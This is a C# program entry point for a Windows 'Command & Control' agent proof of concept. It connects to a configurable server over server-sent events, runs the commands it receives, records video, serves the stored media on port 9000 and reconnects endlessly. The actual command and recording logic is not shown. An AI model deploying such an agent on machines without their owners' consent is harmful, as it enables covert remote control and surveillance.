using Agent;
using Agent.Models;

namespace AgentApp
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("╔═══════════════════════════════════════════╗");
            Console.WriteLine("║  C2 Agent - Windows Command & Control    ║");
            Console.WriteLine("║  POC - Sistema de Controle Remoto         ║");
            Console.WriteLine("╚═══════════════════════════════════════════╝");
            Console.WriteLine();

            // Configuration
            var config = new AgentConfig
            {
                ServerUrl = GetServerUrl(args),
                AgentId = GenerateAgentId(),
                Hostname = Environment.MachineName,
                ReconnectDelayMs = 5000,
                MaxReconnectAttempts = -1 // Infinite
            };

            Console.WriteLine($"Agent ID: {config.AgentId}");
            Console.WriteLine($"Hostname: {config.Hostname}");
            Console.WriteLine($"Server URL: {config.ServerUrl}");
            Console.WriteLine();

            // Define storage path for media files
            string storageBasePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "C2Agent"
            );

            Console.WriteLine($"Storage Path: {storageBasePath}");
            Console.WriteLine();

            // Create executor and SSE client
            var executor = new CommandExecutor(
                agentId: config.AgentId,
                storageBasePath: storageBasePath,
                commandTimeoutMs: 60000
            );

            var sseClient = new SseClient(config, executor);

            // Start HTTP server for media preview (with recorder reference to prevent locked file access)
            var httpServer = new MediaHttpServer(
                storageBasePath,
                port: 9000,
                videoRecorder: executor.VideoRecorder
            );
            try
            {
                httpServer.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Warning: Could not start HTTP server: {ex.Message}");
                Console.WriteLine("Preview functionality will not be available.");
            }

            // Subscribe to log events
            sseClient.OnLog += (sender, message) =>
            {
                Console.WriteLine(message);
            };

            // Handle Ctrl+C gracefully
            var cts = new CancellationTokenSource();
            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                Console.WriteLine();
                Console.WriteLine("Encerrando agente...");
                cts.Cancel();
            };

            // Main loop with reconnect logic
            int reconnectAttempt = 0;

            while (!cts.Token.IsCancellationRequested)
            {
                try
                {
                    reconnectAttempt++;

                    if (reconnectAttempt > 1)
                    {
                        Console.WriteLine($"Tentativa de reconexão #{reconnectAttempt}...");
                        await Task.Delay(config.ReconnectDelayMs, cts.Token);
                    }

                    await sseClient.ConnectAsync(cts.Token);

                    // If we reach here, connection was closed gracefully
                    Console.WriteLine("Conexão encerrada pelo servidor");
                }
                catch (OperationCanceledException)
                {
                    // User requested shutdown
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Erro de conexão: {ex.Message}");

                    if (config.MaxReconnectAttempts > 0 && reconnectAttempt >= config.MaxReconnectAttempts)
                    {
                        Console.WriteLine($"Máximo de tentativas ({config.MaxReconnectAttempts}) atingido. Encerrando...");
                        break;
                    }
                }
            }

            // Cleanup resources
            httpServer.Dispose();
            executor.Dispose();

            Console.WriteLine();
            Console.WriteLine("Agente encerrado.");
        }

        /// <summary>
        /// Generate agent ID based on hostname
        /// </summary>
        static string GenerateAgentId()
        {
            var hostname = Environment.MachineName.ToLowerInvariant();
            return hostname;
        }

        /// <summary>
        /// Get server URL from command line args or use default
        /// </summary>
        static string GetServerUrl(string[] args)
        {
            if (args.Length > 0)
            {
                return args[0];
            }

            // Try to read from environment variable
            var envUrl = Environment.GetEnvironmentVariable("C2_SERVER_URL");
            if (!string.IsNullOrEmpty(envUrl))
            {
                return envUrl;
            }

            return "http://localhost:8000";
        }
    }
}
